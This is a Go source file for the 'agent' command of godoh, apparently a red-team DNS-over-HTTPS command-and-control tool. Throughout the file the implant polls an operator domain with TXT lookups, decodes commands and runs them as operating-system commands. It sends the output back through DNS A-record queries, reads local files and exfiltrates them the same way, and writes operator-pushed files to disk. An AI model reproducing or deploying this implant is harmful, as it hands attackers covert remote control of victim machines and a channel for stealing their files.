package cmd

import (
	"crypto/sha1"
	"encoding/hex"
	"fmt"
	"hash/crc32"
	"io/ioutil"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"
	"github.com/sensepost/godoh/lib"
	"github.com/sensepost/godoh/protocol"
	"github.com/spf13/cobra"
)

var agentCmdAgentName string
var agentCmdAgentPoll int

// agentCmd represents the agent command
var agentCmd = &cobra.Command{
	Use:   "agent",
	Short: "Connect as an Agent to the DoH C2",
	Long: `Connect as an Agent to the DoH C2.

Example:
	godoh --domain example.com agent
	godoh --domain example.com agent -n agent1
	godoh --domain example.com agent --agent-name agent1 --poll-time 5`,
	Run: func(cmd *cobra.Command, args []string) {

		log := options.Logger

		if agentCmdAgentName == "" {
			agentCmdAgentName = lib.RandomString(5)
		}

		log.Debug().Msg("resolving dns client")
		client, err := options.GetDNSClient()
		if err != nil {
			log.Fatal().Err(err).Msg("failed to get dns client")
		}

		log.Debug().Msg("polling started")

		for {
			// Wait for the next poll!
			time.Sleep(time.Second * time.Duration(agentCmdAgentPoll))

			pollDomain := fmt.Sprintf("%x.%d.%s.%s", agentCmdAgentName, protocol.PollTypeCheckin, lib.RandomString(4), options.Domain)
			log.Debug().Str("poll-domain", pollDomain).Msg("poll domain")

			// Do lookup
			response := client.Lookup(pollDomain, dns.TypeTXT)
			log.Debug().Str("payload", response.Data).Msg("TXT lookup response")

			// Do nothing.
			if strings.Contains(response.Data, protocol.NoCmdTxtResponse) {
				continue
			}

			if strings.Contains(response.Data, protocol.ErrorTxtResponse) {
				log.Error().Msg("server indicated an error. stopping :(")
				continue
			}

			if strings.Contains(response.Data, protocol.CmdTxtResponse) {

				cmdParsed := strings.Split(response.Data, "p=")[1]
				cmd := strings.Split(cmdParsed, "\"")[0]
				log.Debug().Str("cmd-data", cmd).Msg("raw command")

				// decode the command
				dataBytes, err := hex.DecodeString(cmd)
				if err != nil {
					log.Error().Err(err).Msg("failed to decode command data")
					return
				}

				var command string
				lib.UngobUnpress(&command, dataBytes)
				log.Debug().Str("cmd", command).Msg("executing command")

				// Execute the command!
				commandSplit := strings.Split(command, " ")
				cmdBin := commandSplit[0]
				cmdArgs := commandSplit[1:]

				// TODO: Check if the command is a `cd` command.
				// If so, set something like cmd.Cwd

				// File download
				if cmdBin == "download" {
					log.Debug().Str("cmd", command).Msg("command is to download a file")
					if err := downloadFile(strings.Join(cmdArgs, " ")); err != nil {
						log.Error().Err(err).Msg("failed to download file")
					}
					continue
				}

				// Exec an os command
				log.Debug().Str("cmd", command).Msg("command is an os command")
				go executeCommand(cmdBin, cmdArgs)
				continue
			}

			// handle file upload
			if strings.Contains(response.Data, protocol.UploadTxtResponse) {

				log.Debug().Msg("receiving file")

				// loop txt queries of type protocol.PollTypeUpload until we get an error to receive the file
				var fileData []byte
				for {
					uploadPollDomain := fmt.Sprintf("%x.%d.%s.%s", agentCmdAgentName, protocol.PollTypeUpload, lib.RandomString(4), options.Domain)
					log.Debug().Str("poll-domain", pollDomain).Msg("poll domain")

					// Do lookup
					response := client.Lookup(uploadPollDomain, dns.TypeTXT)
					log.Debug().Str("payload", response.Data).Msg("TXT lookup response")

					// server stopped?
					if response.Data == "" {
						break
					}

					// we're done, break
					if !strings.Contains(response.Data, protocol.UploadTxtResponse) {
						break
					}

					// v=B2B3FE1C,8dbc.1.defe2799.0.64.12cc5...
					filePayload := strings.Split(response.Data, ",")
					filePayload = strings.Split(filePayload[1], ".")

					// ident.seq.crc32.proto.datalen.data

					byteData, err := hex.DecodeString(filePayload[5])
					if err != nil {
						log.Err(err).Msg("failed to decode data payload from string")
						break
					}

					byteLen, err := strconv.Atoi(filePayload[4])
					if err != nil {
						log.Err(err).Msg("failed to convert data length to int")
						break
					}

					if len(byteData) != byteLen {
						log.Error().Int("expected", byteLen).Int("real", len(byteData)).
							Msg("expected and real data length does not match")
						break
					}

					byteCrc := fmt.Sprintf("%02x", crc32.ChecksumIEEE(byteData))
					if filePayload[2] != byteCrc {
						log.Warn().Str("expected-crc", filePayload[2]).Str("calculated-crd", byteCrc).Msg("crc32 check failed")
						break
					}

					fileData = append(fileData, byteData...)
				}

				// decode/decrypt
				var realFileData protocol.File
				lib.UngobUnpress(&realFileData, fileData)

				// check shasum
				h := sha1.New()
				h.Write(*realFileData.Data)

				realSha := hex.EncodeToString(h.Sum(nil))
				if realFileData.Shasum != realSha {
					log.Debug().Str("expected", realFileData.Shasum).Str("real", realSha).Msg("shasum of downloaded file does not match")
				}

				f, err := os.Create(realFileData.Destination)
				if err != nil {
					log.Err(err).Str("file", realFileData.Destination).Msg("failed to create file")
					break
				}
				defer f.Close()
				f.Write(*realFileData.Data)

				log.Debug().Str("file", realFileData.Destination).Msg("wrote file to disk")
			}
		}
	},
}

func init() {
	rootCmd.AddCommand(agentCmd)

	agentCmd.Flags().StringVarP(&agentCmdAgentName, "agent-name", "n", "", "Agent name to use. (default: random)")
	agentCmd.Flags().IntVarP(&agentCmdAgentPoll, "poll-time", "t", 10, "Time in seconds between polls.")
}

// executeCommand executes an OS command
func executeCommand(cmdBin string, cmdArgs []string) {
	log := options.Logger

	out, err := exec.Command(cmdBin, cmdArgs...).CombinedOutput()
	if err != nil {
		out = []byte(err.Error())
	}

	// Send the response back to the server!
	commandOutput := protocol.Command{}
	commandOutput.Data = out
	commandOutput.ExecTime = time.Now().UTC().UnixNano()

	commandOutput.Prepare(cmdBin + strings.Join(cmdArgs, " "))
	requests, successFlag := commandOutput.GetRequests()

	log.Debug().Int("requests", len(requests)).Msg("result request count")

	client, err := options.GetDNSClient()
	if err != nil {
		log.Fatal().Err(err).Msg("failed to get dns client")
	}

	for _, r := range requests {
		response := client.Lookup(fmt.Sprintf("%s.%s", r, options.Domain), dns.TypeA)

		if response.Data == successFlag {
			log.Debug().Str("response", response.Data).Str("labels", r).Msg("request success")
		} else {
			log.Debug().Str("response", response.Data).Str("labels", r).Msg("request failed. exiting")
			return
		}
	}
}

// downloadFile downloads a file from the agent
func downloadFile(fileName string) error {
	log := options.Logger

	file, err := os.Open(fileName)
	if err != nil {
		return err
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		return err
	}

	fileBuffer, err := ioutil.ReadAll(file)
	if err != nil {
		return err
	}

	message := protocol.File{}
	message.Prepare(&fileBuffer, fileInfo)
	requests, successFlag := message.GetARequests()

	client, err := options.GetDNSClient()
	if err != nil {
		log.Fatal().Err(err).Msg("failed to get dns client")
	}

	for _, r := range requests {
		response := client.Lookup(fmt.Sprintf("%s.%s", r, options.Domain), dns.TypeA)

		if response.Data == successFlag {
			log.Debug().Str("response", response.Data).Str("labels", r).Msg("request success")
		} else {
			log.Debug().Str("response", response.Data).Str("labels", r).Msg("request failed. exiting")
			return nil
		}
	}

	return nil
}
